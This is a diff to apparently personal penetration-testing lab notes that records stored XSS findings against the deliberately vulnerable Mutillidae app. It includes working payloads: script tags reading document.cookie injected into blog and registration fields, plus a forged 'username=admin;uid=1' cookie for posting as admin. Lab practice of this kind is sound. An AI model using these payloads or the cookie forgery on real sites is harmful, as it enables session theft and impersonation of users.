@@ -407,6 +407,39 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Tags allowed**: `script img svg body input iframe details math marquee`   
 - **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
 
+#### `WSTG-INPV-02` · `Stored XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** `http://meta2/mutillidae/index.php?page=add-to-your-blog.php`
+- **Evidence:** all chars
+- **Type and technique:** `Stored XSS`
+- **Payload:** `csrf-token=SecurityIsDisabled&blog_entry=<script>alert(document.cookie)</script>&add-to-your-blog-php-submit-button=Save+Blog+Entry`
+- **Target:** `HTML body`
+- **Impact:** `HTML body injection`
+
+#### `WSTG-INPV-02` · `Stored XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** 
+    - `http://meta2/mutillidae/index.php?page=regiser.php`
+    - `http://meta2/mutillidae/index.php?page=login.php`
+- **Evidence:** all chars
+- **Type and technique:** `Stored XSS`
+- **Payload:** `username=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&password=zzXSS9f2a&confirm_password=zzXSS9f2a&my_signature=zzXSS9f2a&register-php-submit-button=Create+Account`
+- **Target:** `HTML body`
+- **Impact:** `XSS injection in both post redirection page when submitting register and also after login`
+
+#### `WSTG-INPV-02` · `Stored XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** 
+    - `http://meta2/mutillidae/index.php?page=add-to-your-blog.php`
+- **Evidence:** all chars
+- **Type and technique:** `Stored XSS`
+- **Payload:** Set cookie `username=admin;uid=1`
+- **Target:** `Cookie injection`
+- **Impact:** `Blog entry is saved under the admin profile`
+
 #### `<WSTG-ID>` · `<Finding title>`
 
 - **Related questions:** `Qxx`
@@ -420,9 +453,12 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 
 - [ ] `<next step>` (from discovery `<n>`)
 
-### 4. Lessons (optional)
+### 4. Lessons
 
-- `<what to do differently next time>`
+*Phases need to be shortened in time*
+
+- During the recon phase, you can start to identify, at the same time, which inputs are reflected, stored or DOM for the XSS phase. Just note that down and keep moving. That eliminates manual curl phase to identify Stored XSS, for example
+- 
 
 ***
 
